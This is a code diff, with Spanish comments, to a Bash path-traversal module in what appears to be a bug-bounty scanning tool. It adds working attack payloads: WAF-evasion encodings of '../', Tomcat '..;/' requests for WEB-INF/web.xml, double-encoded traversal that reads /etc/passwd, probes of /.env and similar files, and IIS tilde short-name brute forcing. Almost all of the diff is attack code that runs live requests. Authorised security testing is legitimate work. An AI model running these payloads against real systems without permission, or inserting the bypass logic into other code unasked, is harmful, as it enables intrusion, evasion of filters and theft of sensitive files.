@@ -33,15 +33,145 @@
 #    6. Static resource path traversal (CVE-2024-38819)
 #       → WebMvc.fn / WebFlux.fn con FileSystemResource
 #
+#  [IIS / ASP.NET]
+#    7. Tilde Short-Name Enumeration (~)
+#       → IIS expone nombres 8.3 via ~ en URLs
+#       → GET /*~1*/ vs /zzz*~1*/ → diferencia 404/400 confirma
+#       → WAF bypass: %7e en lugar de ~
+#
+#  [WAF Bypass Layer — todos los tests anteriores]
+#    - Double URL encode: ../ → ..%252F (WAF ve literal; Apache/IIS decodifican)
+#    - UTF-8 overlong: / → %c0%af
+#    - Unicode fullwidth: / → %ef%bc%8f  . → %ef%bc%8e
+#    - Encoded semicolon: ; → %3b, %253b
+#    - Mixed case hex: %2F vs %2f
+#    - Null byte suffix: path%00
+#    - Dot segments: /./path, path/.
+#    - Backslash: %5c (backends Windows)
+#
 #  Referencias:
 #    Orange Tsai: https://blog.orange.tw/posts/2024-08-confusion-attacks-en/
 #    CVE-2025-24813: github.com/MuhammadWaseem29/CVE-2025-24813
 #    CVE-2025-55752: github.com/TAM-K592/CVE-2025-55752
 #    CVE-2024-38819: spring.io/security/cve-2024-38819
+#    IIS Short-Name: github.com/irsdl/IIS-ShortName-Scanner
 # ============================================================
 
 MODULE_NAME="path_confusion"
-MODULE_DESC="Path Traversal y Confusion Attacks (Orange Tsai + Tomcat + Spring)"
+MODULE_DESC="Path Traversal y Confusion Attacks (Orange Tsai + Tomcat + Spring + WAF bypass)"
+
+# ══════════════════════════════════════════════════════════════
+#  WAF BYPASS LAYER
+#
+#  Cuando un payload directo recibe 403/406/444/429, el WAF lo
+#  bloqueó. Las funciones de bypass generan variantes codificadas
+#  que el WAF no normaliza pero Apache/Tomcat sí procesan.
+#
+#  Técnicas de encoding (aprendidas en auditorías BBP reales):
+#    a) Double URL encode:  ../  →  ..%252F      (WAF ve %252F literal)
+#    b) UTF-8 overlong:     /    →  %c0%af       (CVE-2001-0131 clásico)
+#    c) Unicode fullwidth:  .    →  %ef%bc%8e    (AWS ALB + Apache)
+#    d) Mixed case hex:     %2f  →  %2F          (algunos WAFs son case-sensitive)
+#    e) Null byte suffix:   path →  path%00      (Apache mod_negotiation)
+#    f) Semicolon suffix:   path →  path;        (Tomcat ignora ; en path)
+#    g) %09 tab en path:    /    →  %09          (algunos WAFs no normalizan tab)
+#    h) Backslash:          /    →  %5c          (IIS/Windows backend)
+#    i) Doble slash:        //   →  /./          (merge_slashes bypass)
+#    j) Unicode superscript: ../ →  ．．/         (fullwidth dots U+FF0E)
+# ══════════════════════════════════════════════════════════════
+
+# ── Detectar si una URL está bloqueada por WAF ────────────────
+_waf_blocks() {
+  local STATUS="$1"
+  case "$STATUS" in
+    403|406|419|429|444|503) return 0 ;;
+    *) return 1 ;;
+  esac
+}
+
+# ── Generar variantes WAF-bypass de un path de traversal ─────
+# Entrada: path con ../ en texto claro (e.g. "../../etc/passwd")
+# Salida:  variantes codificadas, una por línea
+_waf_traversal_variants() {
+  local PLAIN="$1"
+
+  # a) Double URL encode: cada / → %252F, cada . → %252E
+  local DOUBLE
+  DOUBLE=$(echo "$PLAIN" | sed 's|/|%252F|g; s|\.|%252E|g')
+  echo "$DOUBLE"
+
+  # b) UTF-8 overlong para /
+  local OVERLONG
+  OVERLONG=$(echo "$PLAIN" | sed 's|/|%c0%af|g')
+  echo "$OVERLONG"
+
+  # c) Unicode fullwidth dots (U+FF0E = %ef%bc%8e)
+  local FULLWIDTH
+  FULLWIDTH=$(echo "$PLAIN" | sed 's|\.\./|%ef%bc%8e%ef%bc%8e/|g')
+  echo "$FULLWIDTH"
+
+  # d) Mix %2F (mayúscula) para / con .. en claro
+  echo "${PLAIN//\//\%2F}"
+
+  # e) %2e%2e para ..
+  echo "${PLAIN//\.\./\%2e%2e}"
+
+  # f) Mix: ..%2F
+  echo "${PLAIN//\//\%2f}"
+
+  # g) Backslash (para backends Windows/IIS)
+  echo "${PLAIN//\//\\}"
+  echo "${PLAIN//\//\%5c}"
+
+  # h) Punto + semicolon Tomcat variant
+  echo "${PLAIN//\.\./\.%00.}"
+
+  # i) Trailing null byte
+  echo "${PLAIN}%00"
+
+  # j) Double-encoded dots
+  echo "${PLAIN//\.\./\%252e%252e}"
+}
+
+# ── Probar un path con bypass WAF si el directo falla ─────────
+# Retorna 0 y escribe la URL que funcionó en stdout si hay bypass
+_try_with_waf_bypass() {
+  local BASE="$1"          # https://host
+  local PLAIN_PATH="$2"    # path en texto claro con ../
+  local EXPECTED_BODY="$3" # regex para confirmar que llegamos al recurso
+  local PROXY="$4"
+
+  # Primero intentar directo
+  local DIRECT_URL="${BASE}${PLAIN_PATH}"
+  local STATUS BODY
+  STATUS=$(curl -sk --max-time 8 ${PROXY} --path-as-is \
+    -o /tmp/.waf_body_$$ -w "%{http_code}" "$DIRECT_URL" 2>/dev/null)
+  BODY=$(cat /tmp/.waf_body_$$ 2>/dev/null); rm -f /tmp/.waf_body_$$
+
+  if [[ "$STATUS" == "200" ]] && echo "$BODY" | grep -qP "$EXPECTED_BODY"; then
+    echo "$DIRECT_URL"
+    return 0
+  fi
+
+  # Si WAF bloqueó o no encontró, probar variantes de bypass
+  if _waf_blocks "$STATUS" || [[ "$STATUS" == "404" ]]; then
+    while IFS= read -r ENCODED_PATH; do
+      [[ -z "$ENCODED_PATH" ]] && continue
+      local BYPASS_URL="${BASE}/${ENCODED_PATH#/}"
+      local BS BB
+      BS=$(curl -sk --max-time 8 ${PROXY} --path-as-is \
+        -o /tmp/.waf_bb_$$ -w "%{http_code}" "$BYPASS_URL" 2>/dev/null)
+      BB=$(cat /tmp/.waf_bb_$$ 2>/dev/null); rm -f /tmp/.waf_bb_$$
+
+      if [[ "$BS" == "200" ]] && echo "$BB" | grep -qP "$EXPECTED_BODY"; then
+        echo "$BYPASS_URL"
+        return 0
+      fi
+    done < <(_waf_traversal_variants "$PLAIN_PATH")
+  fi
+
+  return 1
+}
 
 # Directorios comunes en alias Nginx
 NGINX_ALIAS_DIRS=(
@@ -265,8 +395,10 @@ _test_apache_confusion() {
   fi
 
   # Test manual: ? para bypassear ACL (Filename Confusion)
+  # Si el WAF devuelve 403 en el payload directo, probar variantes WAF-bypass
   for PPATH in "/admin" "/administrator" "/manager" "/.htaccess" \
-               "/config" "/.env" "/server-status" "/phpinfo.php"; do
+               "/config" "/.env" "/server-status" "/phpinfo.php" \
+               "/WEB-INF" "/META-INF" "/web.config" "/app.config"; do
     local S_NORMAL
     S_NORMAL=$(curl -sL --max-time 8 ${PROXY} \
       -o /dev/null -w "%{http_code}" "${BASE}${PPATH}" 2>/dev/null)
@@ -293,10 +425,36 @@ _test_apache_confusion() {
         "%23 bypasea control de acceso en ${PPATH}" \
         "apache_hash_confusion"
     fi
+
+    # ── WAF bypass layer: cuando WAF bloquea pero Apache procesa ──
+    # Double-encoded path: WAF ve %2F literal, Apache lo normaliza
+    local WAF_BYPASSES=(
+      "${PPATH/\//\/%2f}"          # %2f (lowercase)
+      "${PPATH/\//\/%2F}"          # %2F (uppercase)
+      "${PPATH}%3F"                # %3F (encoded ?)
+      "${PPATH}%3f"                # %3f (lowercase)
+      "$(echo "$PPATH" | sed 's|/|/%ef%bc%8f|g')"   # Unicode fullwidth slash
+      "$(echo "$PPATH" | sed 's|/|/./|g')"           # /./path (dot segment)
+      "${PPATH}/."                 # trailing dot segment
+    )
+    for WB in "${WAF_BYPASSES[@]}"; do
+      [[ -z "$WB" || "$WB" == "$PPATH" ]] && continue
+      local WBS
+      WBS=$(curl -sL --max-time 8 ${PROXY} -g \
+        -o /dev/null -w "%{http_code}" "${BASE}${WB}" 2>/dev/null)
+      if [[ "$WBS" == "200" ]]; then
+        _finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${WB}" \
+          "Apache ACL Bypass — WAF Encoding Bypass" "high" \
+          "WAF bloqueó ${PPATH} (403) pero ${WB} bypasea filtro WAF → Apache procesa path sin ACL" \
+          "apache_waf_encoding_bypass"
+        break
+      fi
+    done
   done
 
   # DocumentRoot Confusion — exposición de código fuente PHP
-  for TEST in "/index.php%3F" "/index.php%3F.txt" "/config.php%3F"; do
+  for TEST in "/index.php%3F" "/index.php%3F.txt" "/config.php%3F" \
+              "/index.php%252F" "/index.php%2F.txt"; do
     local S_SRC BODY
     S_SRC=$(curl -sL --max-time 8 ${PROXY} -g \
       -o /tmp/.ot_src_$$ -w "%{http_code}" "${BASE}${TEST}" 2>/dev/null)
@@ -308,6 +466,34 @@ _test_apache_confusion() {
         "Apache DocumentRoot Confusion — PHP Source" "critical" \
         "Código fuente PHP expuesto via DocumentRoot confusion: ${TEST}" \
         "apache_docroot_confusion"
+    fi
+  done
+
+  # ── Double-encoded traversal (%252F) ──────────────────────────
+  # WAF no detecta %25 como %; Apache/Tomcat decodifican dos veces
+  # Esto activa unhandled exceptions en algunas implementaciones
+  local DOUBLE_ENC_PATHS=(
+    "/%252e%252e%252f%252e%252e%252fetc%252fpasswd"
+    "/..%252F..%252Fetc%252Fpasswd"
+    "/..%252f..%252fetc%252fpasswd"
+  )
+  for DE_PATH in "${DOUBLE_ENC_PATHS[@]}"; do
+    local DE_S DE_B
+    DE_S=$(curl -sk --max-time 8 ${PROXY} --path-as-is \
+      -o /tmp/.ot_de_$$ -w "%{http_code}" "${BASE}${DE_PATH}" 2>/dev/null)
+    DE_B=$(head -c 100 /tmp/.ot_de_$$ 2>/dev/null); rm -f /tmp/.ot_de_$$
+    if [[ "$DE_S" == "200" ]] && echo "$DE_B" | grep -qP 'root:x:|daemon:|nobody:'; then
+      _finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${DE_PATH}" \
+        "Apache Double-Encoded Traversal" "critical" \
+        "%252F (double URL encode) bypasea WAF + Apache normaliza → /etc/passwd leído" \
+        "apache_double_encoded_traversal"
+    fi
+    # También flag 500 como informational (evidencia de double-decode vulnerabilidad)
+    if [[ "$DE_S" == "500" ]]; then
+      _finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${DE_PATH}" \
+        "Apache Double-Encoded Path — Internal Error" "low" \
+        "Double-encoded %252F llega al app layer (WAF no filtra) y provoca excepción — confirma decode doble" \
+        "apache_double_encode_500"
     fi
   done
 }
@@ -385,11 +571,22 @@ _test_tomcat_semicolon() {
   done
 
   # También probar patrones directos estándar de Tomcat
+  # Con variantes WAF-bypass para cada uno
   local DIRECT_PAYLOADS=(
     "/..;/WEB-INF/web.xml"
     "/..;/META-INF/"
     "/app/..;/WEB-INF/web.xml"
     "/api/..;/WEB-INF/web.xml"
+    # WAF bypass: semicolon encoded → WAF no detecta ..;/ pero Tomcat procesa
+    "/..%3b/WEB-INF/web.xml"
+    "/app/..%3b/WEB-INF/web.xml"
+    # Double-encoded semicolon
+    "/..%253b/WEB-INF/web.xml"
+    # Semicolon + double-encoded slash
+    "/..;%2fWEB-INF%2fweb.xml"
+    "/..;%252fWEB-INF%252fweb.xml"
+    # Unicode semicolon (U+FF1B = %ef%bc%9b)
+    "/..%ef%bc%9b/WEB-INF/web.xml"
   )
   for PAYLOAD in "${DIRECT_PAYLOADS[@]}"; do
     local S_D BODY_D
@@ -400,10 +597,12 @@ _test_tomcat_semicolon() {
 
     if [[ "$S_D" == "200" ]] && \
        echo "$BODY_D" | grep -qi "web-app\|servlet\|Manifest-Version"; then
+      local TMPL="tomcat_semicolon_direct"
+      echo "$PAYLOAD" | grep -q '%' && TMPL="tomcat_semicolon_waf_bypass"
       _finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${PAYLOAD}" \
         "Tomcat ..;/ Path Confusion" "critical" \
-        "CVE-2025-24813: acceso directo a archivo protegido via ..;/" \
-        "tomcat_semicolon_direct"
+        "Acceso a archivo protegido via ..;/ (encoding: ${PAYLOAD})" \
+        "$TMPL"
     fi
   done
 }
@@ -543,6 +742,81 @@ _test_spring_traversal() {
 }
 
 # ══════════════════════════════════════════════════════════════
+#  7. IIS — Tilde Short-Name Enumeration (~)
+#  IIS expone nombres 8.3 de archivos/directorios a través del
+#  carácter ~ en la URL. Permite enumerar archivos que no se
+#  conocen incluso cuando el listado de directorio está off.
+#
+#  Técnica:
+#    GET /a~1*/            → 404 si hay algo que empieza por 'a'
+#                           → 400 si no hay nada que empieza por 'a'
+#  Con esto se pueden bruteforcear nombres de archivos carácter
+#  a carácter. Herramienta: IIS-ShortName-Scanner
+#
+#  También: ~1 en paths de archivos conocidos expone el nombre real
+#    /a~1.asp  → puede servir el archivo real si la ACL es incorrecta
+# ══════════════════════════════════════════════════════════════
+_test_iis_tilde() {
+  local BASE="$1" DOMAIN_ID="$2" DOMAIN="$3" PROXY="$4"
+
+  log_info "  [IIS tilde short-name] $BASE"
+
+  # Verificar que IIS está presente
+  local HEADERS
+  HEADERS=$(curl -sk --max-time 8 ${PROXY} -I "${BASE}/" 2>/dev/null)
+  echo "$HEADERS" | grep -qi "^Server:.*IIS\|^X-Powered-By:.*ASP" || return
+
+  # Sonda básica: respuesta diferente para letra existente vs no existente
+  # Si GET /*~1*/  devuelve 404 y GET /zzz*~1*/ devuelve 400 → vulnerable
+  local S_WILD S_NOWILD
+  S_WILD=$(curl -sk --max-time 8 ${PROXY} -g \
+    -o /dev/null -w "%{http_code}" "${BASE}/*~1*/" 2>/dev/null)
+  S_NOWILD=$(curl -sk --max-time 8 ${PROXY} -g \
+    -o /dev/null -w "%{http_code}" "${BASE}/zzzzzzzz~1*/" 2>/dev/null)
+
+  if [[ "$S_WILD" == "404" && "$S_NOWILD" == "400" ]]; then
+    _finding "$DOMAIN_ID" "$DOMAIN" "${BASE}" \
+      "IIS Tilde Short-Name Enumeration" "medium" \
+      "IIS revela nombres 8.3 (/*~1*/ → 404 vs /zzz*~1*/ → 400) — enumerate archivos ocultos" \
+      "iis_tilde_enum"
+
+    # Intentar enumerar archivos en /: bruteforce letra inicial
+    local FOUND_NAMES=()
+    for CHAR in a b c d e f g h i j k l m n o p q r s t u v w x y z \
+                0 1 2 3 4 5 6 7 8 9 _ -; do
+      local S_CHAR
+      S_CHAR=$(curl -sk --max-time 5 ${PROXY} -g \
+        -o /dev/null -w "%{http_code}" "${BASE}/${CHAR}*~1*/" 2>/dev/null)
+      [[ "$S_CHAR" == "404" ]] && FOUND_NAMES+=("${CHAR}*")
+    done
+
+    if [[ ${#FOUND_NAMES[@]} -gt 0 ]]; then
+      _finding "$DOMAIN_ID" "$DOMAIN" "${BASE}" \
+        "IIS Tilde — Nombres enumerados" "medium" \
+        "Primeras letras con archivos: [${FOUND_NAMES[*]}] — usar IIS-ShortName-Scanner para completar" \
+        "iis_tilde_names"
+    fi
+  fi
+
+  # Variantes WAF-bypass para el tilde
+  # Algunos WAF filtran ~ pero no %7e
+  if [[ "$S_WILD" != "404" ]]; then
+    local S_ENC
+    S_ENC=$(curl -sk --max-time 8 ${PROXY} -g \
+      -o /dev/null -w "%{http_code}" "${BASE}/*%7e1*/" 2>/dev/null)
+    local S_NO_ENC
+    S_NO_ENC=$(curl -sk --max-time 8 ${PROXY} -g \
+      -o /dev/null -w "%{http_code}" "${BASE}/zzzzzzzz%7e1*/" 2>/dev/null)
+    if [[ "$S_ENC" == "404" && "$S_NO_ENC" == "400" ]]; then
+      _finding "$DOMAIN_ID" "$DOMAIN" "${BASE}" \
+        "IIS Tilde Short-Name — WAF Bypass (%7e)" "medium" \
+        "WAF filtra ~ pero %7e pasa — IIS tilde enumerable via %7e encoding" \
+        "iis_tilde_waf_bypass"
+    fi
+  fi
+}
+
+# ══════════════════════════════════════════════════════════════
 #  Función principal
 # ══════════════════════════════════════════════════════════════
 module_run() {
@@ -596,6 +870,7 @@ module_run() {
     echo "$TECH" | grep -qi "apache"     && ! echo "$TECH" | grep -qi "tomcat" && TESTS="${TESTS} apache_httpd"
     echo "$TECH" | grep -qi "tomcat"     && TESTS="${TESTS} tomcat"
     echo "$TECH" | grep -qi "spring\|java\|boot" && TESTS="${TESTS} spring"
+    echo "$TECH" | grep -qi "iis\|asp\.net\|asp"   && TESTS="${TESTS} iis"
 
     # Si no detectamos nada específico, intentar off-by-slash
     # (muy común, falsos positivos bajos)
@@ -620,6 +895,10 @@ module_run() {
 
     if echo "$TESTS" | grep -qi "spring"; then
       _test_spring_traversal    "$BASE" "$DOMAIN_ID" "$DOMAIN" "$CURL_PROXY"
+    fi
+
+    if echo "$TESTS" | grep -qi "iis"; then
+      _test_iis_tilde           "$BASE" "$DOMAIN_ID" "$DOMAIN" "$CURL_PROXY"
     fi
 
     # off-by-slash si no detectamos nada (probe ligero)
